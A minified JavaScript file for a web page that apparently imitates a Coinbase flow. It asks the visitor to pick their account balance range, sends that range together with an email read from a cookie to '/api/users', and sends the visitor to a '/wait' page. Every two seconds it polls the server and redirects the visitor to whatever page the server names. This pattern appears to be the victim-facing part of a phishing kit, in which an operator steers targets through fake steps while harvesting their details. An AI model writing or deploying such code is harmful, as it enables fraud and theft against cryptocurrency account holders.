import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";document.addEventListener("DOMContentLoaded",function(){setInterval(async()=>{try{const t=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||"");if(!t)return;const a=await(await fetch("/api/users?email="+encodeURIComponent(t))).json();a.current_page&&a.current_page!=="balance"&&(window.location.href="/"+a.current_page)}catch(t){console.error("Error checking current page:",t)}},2e3);const n=document.getElementById("balanceForm"),e=n?.querySelector(".coinbase-continue-btn"),i=n?.querySelectorAll('input[name="balance"]'),l=()=>{const t=Array.from(i||[]).some(o=>o.checked);e&&(e.disabled=!t)};i?.forEach(t=>{t.addEventListener("change",l)}),l(),n?.addEventListener("submit",async t=>{t.preventDefault();const a=n.querySelector('input[name="balance"]:checked')?.value;if(a)try{e&&(e.disabled=!0,e.textContent="Submitting...");const c=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||""),r=await fetch("/api/users",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:c,balance_range:a,current_page:"wait"})});if(r.ok)window.location.href="/wait";else{const d=await r.json(),s=document.createElement("div");s.className="error-message",s.textContent=d.message||"Failed to submit balance. Please try again.",n.insertBefore(s,n.firstChild),e&&(e.disabled=!1,e.textContent="Continue")}}catch(c){console.error("Error submitting balance:",c);const r=document.createElement("div");r.className="error-message",r.textContent="Network error. Please try again.",n.insertBefore(r,n.firstChild),e&&(e.disabled=!1,e.textContent="Continue")}else alert("Please select your current balance.")})});
